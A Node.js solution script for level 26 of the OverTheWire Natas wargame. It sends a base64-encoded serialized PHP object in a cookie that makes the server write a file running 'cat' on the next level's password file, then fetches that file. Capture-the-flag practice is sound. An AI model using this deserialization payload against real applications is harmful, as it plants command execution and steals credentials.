const http = require("http");
const fs = require("fs");

// Creds
const init = 25;
const user = "natas" + (init + 1);
const pass = fs
  .readFileSync("../../../etc/otw/natas.pass", "utf8")
  .split("\n")
  [init].trim();

// Conf
const uri = `http://${user}.natas.labs.overthewire.org/`;
const auth = Buffer.from(`${user}:${pass}`).toString("base64");
const opts = {
  headers: {
    Authorization: `Basic ${auth}`,
  },
};

// Get
const initGet = new Promise((resolve, reject) => {
  const get = http.get(uri, opts, (res) => {
    const cookies = res.headers["set-cookie"];

    if (cookies) {
      const phpsessid = cookies[0].split(";")[0].split("=")[1];
      resolve(phpsessid);
    } else {
      reject(new Error("No cookies recieved."));
    }
  });
  get.on("error", (e) => console.error("Error:", e.message));
  get.end();
});

const args = new URLSearchParams({
  x1: 0,
  y1: 0,
  x2: 500,
  y2: 500,
});

initGet
  .then((phpsessid) => {
    const url = `${uri}?${args}`;
    opts.headers["Cookie"] =
      `PHPSESSID=${phpsessid};drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTA6Ijw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+IjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTA6Ijw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9`;
    const sndGet = http.get(url, opts, (_) => {});
    sndGet.on("error", (e) => console.error("Error:", e.message));
    sndGet.end();
  })
  .then((_) => {
    const url = `${uri}img/pass.php`;
    const finalGet = http.get(url, opts, (res) => {
      res.on("data", (chunk) => process.stdout.write(chunk));
    });
    finalGet.on("error", (e) => console.error("Error:", e.message));
    finalGet.end();
  });